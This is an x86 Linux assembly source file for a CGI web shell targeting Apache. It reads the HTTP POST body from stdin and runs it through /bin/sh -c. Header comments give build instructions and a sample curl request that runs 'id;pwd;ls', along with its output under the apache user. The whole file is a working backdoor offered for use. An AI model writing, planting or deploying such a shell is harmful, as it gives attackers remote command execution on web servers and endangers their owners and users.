; coder-> mmxm
; cgi shell for apache (linux x86)
; $ nasm -f elf post-cgi-shell.asm
; $ ld -m elf_i386 -o post-cgi-shell post-cgi-shell.o
; $ curl localhost/cgi-bin/post-cgi-shell -d 'id;pwd;ls'
; uid=48(apache) gid=48(apache) groups=48(apache)
; /var/www/cgi-bin
; post-cgi-shell
; post-cgi-shell.asm
; post-cgi-shell.o

section .rodata
	sh db '/bin/sh',0x0,'-c',0x0

section .text
	global _start
_start:
	mov ebp, esp
	sub esp, 1044

	mov byte [ebp-4], 0x0a

	xor eax, eax
	xor ebx, ebx

	mov dword [ebp-1044], sh
	mov dword [ebp-1040], sh+8

	lea ecx, [ebp-1028]
	mov [ebp-1036], ecx

	mov dword [ebp-1032], 0


	mov al, 4

	lea ecx, [ebp-4]
	inc ebx
	mov edx, ebx

	int 0x80

	test al, al ; check if return -1, if yes clear eax
	jns $+4
	xor eax, eax

	; read stdin

	mov al, 3
	dec ebx
	lea ecx, [ebp-1028]
	mov dx, 1023

	int 0x80

	test eax, eax
	js exit

	mov byte [ecx+eax], 0 ; null byte terminator

	; execve

	xor eax, eax
	mov al, 11
	mov ebx, sh
	lea ecx, [ebp-1044]
	xor edx, edx

	int 0x80



exit:
	xor eax, eax
	xor ebx, ebx
	inc eax

	int 0x80
